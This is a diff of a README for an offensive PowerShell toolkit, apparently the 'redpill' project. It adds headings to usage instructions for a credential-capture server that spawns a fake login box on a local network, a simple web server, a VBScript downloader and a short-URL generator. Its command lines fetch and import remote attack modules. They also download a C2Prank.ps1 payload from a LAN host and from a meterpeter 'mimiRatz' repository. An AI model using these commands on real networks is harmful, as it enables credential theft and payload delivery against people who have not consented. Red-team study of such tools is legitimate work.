@@ -4,10 +4,12 @@
 |---|---|---|---|
 |CaptureServer|Captute HTTP credentials on local lan (spawns credential box)|Administrator|[screenshot](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/HTTP-Server/webcreds.png)|
 
+**download cmdLet:**
 ```powershell
 iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/HTTP-Server/CaptureServer.ps1" -OutFile "CaptureServer.ps1"
 ```
 
+**execute:**
 ```powershell
 Import-Module -Name ".\CaptureServer.ps1" -Force
 CaptureServer -AuthType "Basic" -IPAddress "192.168.1.72" -LogFilePath "$Env:TMP\CaptureServer.txt"
@@ -22,10 +24,12 @@ Start "http://192.168.1.72:80"
 |---|---|---|---|
 |Start-SimpleHTTPServer|Simple HTTP pure powershell webserver|Administrator|Current directory its used as webroot|
 
+**download cmdLet:**
 ```powershell
 iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/HTTP-Server/Start-SimpleHTTPServer.ps1" -OutFile "Start-SimpleHTTPServer.ps1"
 ```
 
+**execute:**
 ```powershell      
 Import-Module -Name ".\Start-SimpleHTTPServer.ps1" -Force
 Start-SimpleHTTPServer -Port "8080"
@@ -39,10 +43,12 @@ Start-SimpleHTTPServer -Port "8080"
 |---|---|---|---|
 |wget.vbs|VBScript to download files from Local Lan|User Land|can be executed using **'cscript'** or **'powershell'** interpreter|
 
+**download script:**
 ```powershell
 iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/HTTP-Server/wget.vbs" -OutFile "wget.vbs"
 ```
 
+**execute:**
 ```powershell      
 cscript wget.vbs http://10.11.0.5/C2Prank.ps1 C2Prank.ps1
 .\wget.vbs https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/C2Prank.ps1 C2Prank.ps1
@@ -56,11 +62,10 @@ cscript wget.vbs http://10.11.0.5/C2Prank.ps1 C2Prank.ps1
 |---|---|---|---|
 |Invoke-ShortUrl|TinyUrl url generator|User Land|Dependencies: python3 (http.server)|
 
+**download cmdLet:**
 ```powershell
 iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/HTTP-Server/Invoke-shorturl.ps1" -OutFile "Invoke-ShortUrl.ps1"
 ```
-
-<br />
 
 **prerequesites checks:**
 ```powershell
@@ -68,6 +73,7 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/HTTP-S
 [optional] python -m http.server 8089 --bind 127.0.0.1
 ```
 
+**execute:**
 ```powershell
 #Get module full help
 Get-Help .\Invoke-ShortUrl.ps1 -Full
